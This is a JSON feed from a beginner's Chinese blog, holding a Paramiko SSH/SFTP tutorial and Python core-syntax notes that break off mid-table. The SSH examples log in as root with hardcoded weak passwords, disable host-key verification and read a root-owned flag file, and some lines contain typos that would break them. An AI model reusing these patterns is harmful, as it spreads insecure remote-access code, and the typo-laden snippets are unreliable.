{
    "version": "https://jsonfeed.org/version/1",
    "title": "go-forward",
    "description": "欢迎来到我的博客(*^﹏^*),本人为新人,你可以阅读我的学习笔记并提出独到的见解~我们将互相学习,共同进步,望大佬们勿喷",
    "home_page_url": "http://chungod.github.io",
    "items": [
        {
            "id": "http://chungod.github.io/2021/05/04/paramiko%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D/",
            "url": "http://chungod.github.io/2021/05/04/paramiko%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D/",
            "title": "Paramiko模块利用",
            "date_published": "2021-05-04T09:20:41.000Z",
            "content_html": "<h2 id=\"paramiko模块介绍\"><a class=\"markdownIt-Anchor\" href=\"#paramiko模块介绍\">#</a> Paramiko 模块介绍</h2>\n<p>ssh 是一个协议，OpenSSH 是其中一个开源实现，paramiko 是 Python 的一个库，实现了 SSHv2 协议 (底层使用 cryptography)。</p>\n<p>有了 Paramiko 以后，我们就可以在 Python 代码中直接使用 SSH 协议对远程服务器执行操作，而不是通过 ssh 命令对远程服务器进行操作。</p>\n<p>由于 paramiko 属于第三方库，所以需要使用如下命令先行安装</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip3 install paramiko</span><br></pre></td></tr></table></figure>\n<p>paramiko 包含两个核心组件：SSHClient 和 SFTPClient。</p>\n<ul>\n<li>SSHClient 的作用类似于 Linux 的 ssh 命令，是对 SSH 会话的封装，该类封装了传输 (Transport)，通道 (Channel) 及 SFTPClient 建立的方法 (open_sftp)，通常用于执行远程命令。</li>\n<li>SFTPClient 的作用类似与 Linux 的 sftp 命令，是对 SFTP 客户端的封装，用以实现远程文件操作，如文件上传、下载、修改文件权限等操作。</li>\n</ul>\n<figure class=\"highlight ruby\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   \t\t\t Paramiko中的几个基础名词\t</span><br><span class=\"line\"><span class=\"number\">1</span>、Channel：是一种类Socket，一种安全的SSH传输通道；</span><br><span class=\"line\"><span class=\"number\">2</span>、Transport：是一种加密的会话，使用时会同步创建了一个加密的Tunnels(通道)，这个Tunnels叫做Channel；</span><br><span class=\"line\"><span class=\"number\">3</span>、Session：是client与Server保持连接的对象，用connect()/start_client()/start_server()开始会话。</span><br></pre></td></tr></table></figure>\n<h2 id=\"paramiko的基本使用\"><a class=\"markdownIt-Anchor\" href=\"#paramiko的基本使用\">#</a> Paramiko 的基本使用</h2>\n<h4 id=\"sshclient常用的方法介绍\"><a class=\"markdownIt-Anchor\" href=\"#sshclient常用的方法介绍\">#</a> SSHClient 常用的方法介绍</h4>\n<p><strong>connect()</strong>：实现远程服务器的连接与认证，对于该方法只有 hostname 是必传参数。</p>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">常用参数</span><br><span class=\"line\">hostname 连接的目标主机</span><br><span class=\"line\">port=SSH_PORT 指定端口</span><br><span class=\"line\">username=None 验证的用户名</span><br><span class=\"line\">password=None 验证的用户密码</span><br><span class=\"line\">pkey=None 私钥方式用于身份验证</span><br><span class=\"line\">key_filename=None 一个文件名或文件列表，指定私钥文件</span><br><span class=\"line\">timeout=None 可选的tcp连接超时时间</span><br><span class=\"line\">allow_agent=True, 是否允许连接到ssh代理，默认为True 允许</span><br><span class=\"line\">look_for_keys=True 是否在~/.ssh中搜索私钥文件，默认为True 允许</span><br><span class=\"line\">compress=False, 是否打开压缩</span><br></pre></td></tr></table></figure>\n<p><strong>set_missing_host_key_policy()</strong>：设置远程服务器没有在 know_hosts 文件中记录时的应对策略。目前支持三种策略：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">设置连接的远程主机没有本地主机密钥或HostKeys对象时的策略，目前支持三种：</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AutoAddPolicy 自动添加主机名及主机密钥到本地HostKeys对象，不依赖load_system_host_key的配置。即新建立ssh连接时不需要再输入yes或no进行确认</span><br><span class=\"line\">WarningPolicy 用于记录一个未知的主机密钥的python警告。并接受，功能上和AutoAddPolicy类似，但是会提示是新连接</span><br><span class=\"line\">RejectPolicy 自动拒绝未知的主机名和密钥，依赖load_system_host_key的配置。此为默认选项</span><br></pre></td></tr></table></figure>\n<p><strong>exec_command()</strong>：在远程服务器执行 Linux 命令的方法</p>\n<p><strong>open_sftp()</strong>：在当前 ssh 会话的基础上创建一个 sftp 会话。该方法会返回一个 SFTPClient 对象。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 利用SSHClient对象的open_sftp()方法，可以直接返回一个基于当前连接的sftp对象，可以进行文件的上传等操作.</span><br><span class=\"line\"></span><br><span class=\"line\">sftp &#x3D; client.open_sftp()</span><br><span class=\"line\">sftp.put(&#39;test.txt&#39;,&#39;text.txt&#39;)</span><br></pre></td></tr></table></figure>\n<h4 id=\"sshclient常用的方法举例\"><a class=\"markdownIt-Anchor\" href=\"#sshclient常用的方法举例\">#</a> SSHClient 常用的方法举例</h4>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> paramiko</span><br><span class=\"line\">client = paramiko.SSHClient()  </span><br><span class=\"line\"><span class=\"comment\"># 实例化SSHClient</span></span><br><span class=\"line\">client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class=\"line\"><span class=\"comment\"># 自动添加策略,保存服务器的主机名和密钥，如不添加,那么不在本地know_hosts文件中记录的文件无法连接</span></span><br><span class=\"line\">client.connect(hostname=<span class=\"string\">&#x27;10.7.5.238&#x27;</span>,port=<span class=\"number\">22</span>,username=<span class=\"string\">&#x27;root&#x27;</span>,password=<span class=\"string\">&#x27;123456&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># 连接SSH服务端,以用户名和密码进行认证</span></span><br><span class=\"line\">stdin, stdout, stderr = client.exec_command(<span class=\"string\">&#x27;cat /root/flagvalue.txt&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># stdout为正确输出, stderr为错误输出, 同时是有一个变量有值</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(stdout.read().decode(<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\"><span class=\"comment\"># 打印执行结果</span></span><br><span class=\"line\">client.close()</span><br><span class=\"line\"><span class=\"comment\"># 关闭SSHClient</span></span><br></pre></td></tr></table></figure>\n<p>执行结果:</p>\n<p><img data-src=\"img/image-20210111092549417.png\" alt=\"image-20210111092549417\"></p>\n<p><strong>密钥连接方式</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 配置私人密钥文件位置</span></span><br><span class=\"line\">private = paramiko.RSAKey.from_private_key_file(<span class=\"string\">&#x27;/Users/ch/.ssh/id_rsa&#x27;</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">#实例化SSHClient</span></span><br><span class=\"line\">client = paramiko.SSHClient()</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">#自动添加策略，保存服务器的主机名和密钥信息，如果不添加，那么不再本地know_hosts文件中记录的主机将无法连接</span></span><br><span class=\"line\">client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">#连接SSH服务端，以用户名和密码进行认证</span></span><br><span class=\"line\">client.connect(hostname=<span class=\"string\">&#x27;10.0.0.1&#x27;</span>,port=<span class=\"number\">22</span>,username=<span class=\"string\">&#x27;root&#x27;</span>,pkey=private)</span><br></pre></td></tr></table></figure>\n<p><strong>SSHClient 封装 Transport</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> paramiko</span><br><span class=\"line\"><span class=\"comment\">#创建一个通道</span></span><br><span class=\"line\">transport = paramiko.Transport((<span class=\"string\">&#x27;10.7.5.238&#x27;</span>,<span class=\"number\">22</span>))</span><br><span class=\"line\">tarnsport.connect(username=<span class=\"string\">&#x27;root&#x27;</span>, password=<span class=\"string\">&#x27;123&#x27;</span>)</span><br><span class=\"line\">ssh = paramiko.SSHClient()</span><br><span class=\"line\">ssh._transport = transport</span><br><span class=\"line\"></span><br><span class=\"line\">stdin, stdout, stderr = ssh.exec_command(<span class=\"string\">&#x27;df -h&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(stdout.read().decode(<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\">transport.close()</span><br></pre></td></tr></table></figure>\n<p>执行结果:</p>\n<p><img data-src=\"img/image-20210111092624833.png\" alt=\"image-20210111092624833\"></p>\n<h4 id=\"sftpclient常用方法介绍\"><a class=\"markdownIt-Anchor\" href=\"#sftpclient常用方法介绍\">#</a> SFTPClient 常用方法介绍</h4>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SFTPCLient作为一个sftp的客户端对象，根据ssh传输协议的sftp会话，实现远程文件操作，如上传、下载、权限、状态</span><br><span class=\"line\"> </span><br><span class=\"line\">from_transport(cls,t) 创建一个已连通的SFTP客户端通道</span><br><span class=\"line\">put(localpath, remotepath, callback&#x3D;None, confirm&#x3D;True) 将本地文件上传到服务器 参数confirm：是否调用stat()方法检查文件状态，返回ls -l的结果</span><br><span class=\"line\">get(remotepath, localpath, callback&#x3D;None) 从服务器下载文件到本地</span><br><span class=\"line\">mkdir() 在服务器上创建目录</span><br><span class=\"line\">remove() 在服务器上删除目录</span><br><span class=\"line\">rename() 在服务器上重命名目录</span><br><span class=\"line\">stat() 查看服务器文件状态</span><br><span class=\"line\">listdir() 列出服务器目录下的文件</span><br></pre></td></tr></table></figure>\n<h4 id=\"sftpclient常用方法举例\"><a class=\"markdownIt-Anchor\" href=\"#sftpclient常用方法举例\">#</a> SFTPClient 常用方法举例</h4>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> paramiko</span><br><span class=\"line\"><span class=\"comment\"># 获取Transport实例</span></span><br><span class=\"line\">tran = paramiko.Transpor((<span class=\"string\">&#x27;10.7.5.238&#x27;</span>,<span class=\"number\">22</span>))</span><br><span class=\"line\"><span class=\"comment\"># 连接SSH服务端</span></span><br><span class=\"line\">tran.connect(username=<span class=\"string\">&#x27;root&#x27;</span>,password=<span class=\"string\">&#x27;123456&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取SFTP实例</span></span><br><span class=\"line\">sftp = paramiko.SFTPClient.from_transport(tran)</span><br><span class=\"line\"><span class=\"comment\"># 设置上传的文件/远程文件路径</span></span><br><span class=\"line\">localpath = <span class=\"string\">&#x27;/root/1.txt&#x27;</span></span><br><span class=\"line\">remotepath = <span class=\"string\">&#x27;/root/1.txt&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 执行上传动作</span></span><br><span class=\"line\">sftp.put(localpath, remotepath)</span><br><span class=\"line\"><span class=\"comment\"># 执行下载动作</span></span><br><span class=\"line\">sftp.get(remotepath, localpath)</span><br><span class=\"line\"></span><br><span class=\"line\">tran.close()</span><br></pre></td></tr></table></figure>\n<p>执行结果:</p>\n<p>客户端</p>\n<p><img data-src=\"img/image-20210111094748230.png\" alt=\"image-20210111094748230\"></p>\n<p>服务端</p>\n<p><img data-src=\"img/image-20210111094758768.png\" alt=\"image-20210111094758768\"></p>\n<h3 id=\"paramiko的综合使用例子\"><a class=\"markdownIt-Anchor\" href=\"#paramiko的综合使用例子\">#</a> Paramiko 的综合使用例子</h3>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SSHConnection</span>(<span class=\"params\"><span class=\"built_in\">object</span></span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, host_dict</span>):</span></span><br><span class=\"line\">        self.host = host_dict[<span class=\"string\">&#x27;host&#x27;</span>]</span><br><span class=\"line\">        self.port = host_dict[<span class=\"string\">&#x27;port&#x27;</span>]</span><br><span class=\"line\">        self.username = host_dict[<span class=\"string\">&#x27;username&#x27;</span>]</span><br><span class=\"line\">        self.pwd = host_dict[<span class=\"string\">&#x27;pwd&#x27;</span>]</span><br><span class=\"line\">        self.__k = <span class=\"literal\">None</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">connect</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        transport = paramiko.Transport((self.host,self.port))</span><br><span class=\"line\">        transport.connect(username=self.username,password=self.pwd)</span><br><span class=\"line\">        self.__transport = transport</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">close</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        self.__transport.close()</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_cmd</span>(<span class=\"params\">self, command</span>):</span></span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">         执行shell命令,返回字典</span></span><br><span class=\"line\"><span class=\"string\">         return &#123;&#x27;color&#x27;: &#x27;red&#x27;,&#x27;res&#x27;:error&#125;或</span></span><br><span class=\"line\"><span class=\"string\">         return &#123;&#x27;color&#x27;: &#x27;green&#x27;, &#x27;res&#x27;:res&#125;</span></span><br><span class=\"line\"><span class=\"string\">        :param command:</span></span><br><span class=\"line\"><span class=\"string\">        :return:</span></span><br><span class=\"line\"><span class=\"string\">        &quot;&quot;&quot;</span></span><br><span class=\"line\">        ssh = paramiko.SSHClient()</span><br><span class=\"line\">        ssh._transport = self.__transport</span><br><span class=\"line\">        <span class=\"comment\"># 执行命令</span></span><br><span class=\"line\">        stdin, stdout, stderr = ssh.exec_command(command)</span><br><span class=\"line\">        <span class=\"comment\"># 获取命令结果</span></span><br><span class=\"line\">        res = unicode_utils.to_str(stdout.read())</span><br><span class=\"line\">        <span class=\"comment\"># 获取错误信息</span></span><br><span class=\"line\">        error = unicode_utils.to_str(stderr.read())</span><br><span class=\"line\">        <span class=\"comment\"># 如果有错误信息，返回error</span></span><br><span class=\"line\">        <span class=\"comment\"># 否则返回res</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> error.strip():</span><br><span class=\"line\">            <span class=\"keyword\">return</span> &#123;<span class=\"string\">&#x27;color&#x27;</span>:<span class=\"string\">&#x27;red&#x27;</span>,<span class=\"string\">&#x27;res&#x27;</span>:error&#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> &#123;<span class=\"string\">&#x27;color&#x27;</span>: <span class=\"string\">&#x27;green&#x27;</span>, <span class=\"string\">&#x27;res&#x27;</span>:res&#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">upload</span>(<span class=\"params\">self,local_path, target_path</span>):</span></span><br><span class=\"line\">        <span class=\"comment\"># 连接，上传</span></span><br><span class=\"line\">        sftp = paramiko.SFTPClient.from_transport(self.__transport)</span><br><span class=\"line\">        <span class=\"comment\"># 将location.py 上传至服务器 /tmp/test.py</span></span><br><span class=\"line\">        sftp.put(local_path, target_path, confirm=<span class=\"literal\">True</span>)</span><br><span class=\"line\">        <span class=\"comment\"># print(os.stat(local_path).st_mode)</span></span><br><span class=\"line\">        <span class=\"comment\"># 增加权限</span></span><br><span class=\"line\">        <span class=\"comment\"># sftp.chmod(target_path, os.stat(local_path).st_mode)</span></span><br><span class=\"line\">        sftp.chmod(target_path, <span class=\"number\">0o755</span>)  <span class=\"comment\"># 注意这里的权限是八进制的，八进制需要使用0o作为前缀</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">download</span>(<span class=\"params\">self,target_path, local_path</span>):</span></span><br><span class=\"line\">        <span class=\"comment\"># 连接，下载</span></span><br><span class=\"line\">        sftp = paramiko.SFTPClient.from_transport(self.__transport)</span><br><span class=\"line\">        <span class=\"comment\"># 将location.py 下载至服务器 /tmp/test.py</span></span><br><span class=\"line\">        sftp.get(target_path, local_path)</span><br><span class=\"line\">    <span class=\"comment\"># 销毁</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__del__</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        self.close()　　</span><br><span class=\"line\"><span class=\"comment\">#unicode_utils.py</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">to_str</span>(<span class=\"params\">bytes_or_str</span>):</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    把byte类型转换为str</span></span><br><span class=\"line\"><span class=\"string\">    :param bytes_or_str:</span></span><br><span class=\"line\"><span class=\"string\">    :return:</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(bytes_or_str, <span class=\"built_in\">bytes</span>):</span><br><span class=\"line\">        value = bytes_or_str.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        value = bytes_or_str</span><br><span class=\"line\">    <span class=\"keyword\">return</span> value</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Paramiko模块利用"
            ]
        },
        {
            "id": "http://chungod.github.io/2021/05/04/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
            "url": "http://chungod.github.io/2021/05/04/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
            "title": "",
            "date_published": "2021-05-04T08:58:29.856Z",
            "content_html": "<h2 id=\"python-核心编程总结\"><a class=\"markdownIt-Anchor\" href=\"#python-核心编程总结\">#</a> <strong>python 核心编程总结</strong></h2>\n<p><strong>如果是一个函数，用类名去调用，如果是一个方法，用对象去调用</strong></p>\n<h3 id=\"第二章快速入门\"><a class=\"markdownIt-Anchor\" href=\"#第二章快速入门\">#</a> <strong>第二章快速入门</strong></h3>\n<p><strong>程序输入和 raw_input () 内建函数</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201106202520792.png\" alt=\"image-20201106202520792\"></strong></p>\n<p><strong>下面是输入一个数值字符串（并将字符串转换为整型）的例子</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201106203129234.png\" alt=\"image-20201106203129234\"></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">格式化符号  转换</span><br><span class=\"line\">\t%s                              字符串      </span><br><span class=\"line\">    %d                              有符号的十进制数 </span><br><span class=\"line\">    %f                              浮点数</span><br><span class=\"line\">    %c                              字符</span><br><span class=\"line\">    %u                              无符号十进制数</span><br><span class=\"line\">    %o                              八进制整数</span><br><span class=\"line\">    %x                              十六进制整数（小写ox）</span><br><span class=\"line\">    %X                              十六进制整数（大写OX）</span><br><span class=\"line\">    %e                              科学技术法（小写e）</span><br><span class=\"line\">    %E                              科学技术法（大写E）</span><br><span class=\"line\">    %g                              %f 和 %e的简写</span><br><span class=\"line\">    %G                              %f 和 %E的简写</span><br></pre></td></tr></table></figure>\n<h3 id=\"运算符\"><a class=\"markdownIt-Anchor\" href=\"#运算符\">#</a> <strong>运算符</strong></h3>\n<p><strong>算术运算符</strong></p>\n<p><strong>以下假设变量： a=10，b=20：</strong></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>运算符</strong></th>\n<th style=\"text-align:left\"><strong>描述</strong></th>\n<th style=\"text-align:left\"><strong>实例</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\"><strong>+</strong></td>\n<td style=\"text-align:left\"><strong>加 - 两个对象相加</strong></td>\n<td style=\"text-align:left\"><strong>a + b 输出结果 30</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>-</strong></td>\n<td style=\"text-align:left\"><strong>减 - 得到负数或是一个数减去另一个数</strong></td>\n<td style=\"text-align:left\"><strong>a - b 输出结果 -10</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">*****</td>\n<td style=\"text-align:left\"><strong>乘 - 两个数相乘或是返回一个被重复若干次的字符串</strong></td>\n<td style=\"text-align:left\"><strong>a * b 输出结果 200</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>/</strong></td>\n<td style=\"text-align:left\"><strong>除 - x 除以 y</strong></td>\n<td style=\"text-align:left\"><strong>b /a 输出结果 2</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>%</strong></td>\n<td style=\"text-align:left\"><strong>取模 - 返回除法的余数</strong></td>\n<td style=\"text-align:left\"><strong>b % a 输出结果 0</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">******</td>\n<td style=\"text-align:left\"><strong>幂 - 返回 x 的 y 次幂</strong></td>\n<td style=\"text-align:left\"><strong>ab 为 10 的 20 次方， 输出结果 100000000000000000000</strong>**</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>//</strong></td>\n<td style=\"text-align:left\"><strong>取整除 - 返回商的整数部分（向下取整）</strong></td>\n<td style=\"text-align:left\"><strong> <code>&gt;&gt;&gt; 9//2 4 &gt;&gt;&gt; -9//2 -5</code> </strong></td>\n</tr>\n</tbody>\n</table>\n<p><strong>比较运算符</strong></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>运算符</strong></th>\n<th style=\"text-align:left\"><strong>描述</strong></th>\n<th style=\"text-align:left\"><strong>实例</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\"><strong>==</strong></td>\n<td style=\"text-align:left\"><strong>等于 - 比较对象是否相等</strong></td>\n<td style=\"text-align:left\"><strong>(a == b) 返回 False。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>!=</strong></td>\n<td style=\"text-align:left\"><strong>不等于 - 比较两个对象是否不相等</strong></td>\n<td style=\"text-align:left\"><strong>(a != b) 返回 true.</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>&lt;&gt;</strong></td>\n<td style=\"text-align:left\"><strong>不等于 - 比较两个对象是否不相等。python3 已废弃。</strong></td>\n<td style=\"text-align:left\"><strong>(a &lt;&gt; b) 返回 true。这个运算符类似！= 。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>&gt;</strong></td>\n<td style=\"text-align:left\"><strong>大于 - 返回 x 是否大于 y</strong></td>\n<td style=\"text-align:left\"><strong>(a&gt; b) 返回 False。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>&lt;</strong></td>\n<td style=\"text-align:left\"><strong>小于 - 返回 x 是否小于 y。所有比较运算符返回 1 表示真，返回 0 表示假。这分别与特殊的变量 True 和 False 等价。</strong></td>\n<td style=\"text-align:left\"><strong>(a &lt; b) 返回 true。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>&gt;=</strong></td>\n<td style=\"text-align:left\"><strong>大于等于 - 返回 x 是否大于等于 y。</strong></td>\n<td style=\"text-align:left\"><strong>(a&gt;= b) 返回 False。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>&lt;=</strong></td>\n<td style=\"text-align:left\"><strong>小于等于 - 返回 x 是否小于等于 y。</strong></td>\n<td style=\"text-align:left\"><strong>(a &lt;= b) 返回 true。</strong></td>\n</tr>\n</tbody>\n</table>\n<p><strong>赋值运算符</strong></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>运算符</strong></th>\n<th style=\"text-align:left\"><strong>描述</strong></th>\n<th style=\"text-align:left\"><strong>实例</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\"><strong>=</strong></td>\n<td style=\"text-align:left\"><strong>简单的赋值运算符</strong></td>\n<td style=\"text-align:left\"><strong>c = a + b 将 a + b 的运算结果赋值为 c</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>+=</strong></td>\n<td style=\"text-align:left\"><strong>加法赋值运算符</strong></td>\n<td style=\"text-align:left\"><strong>c += a 等效于 c = c + 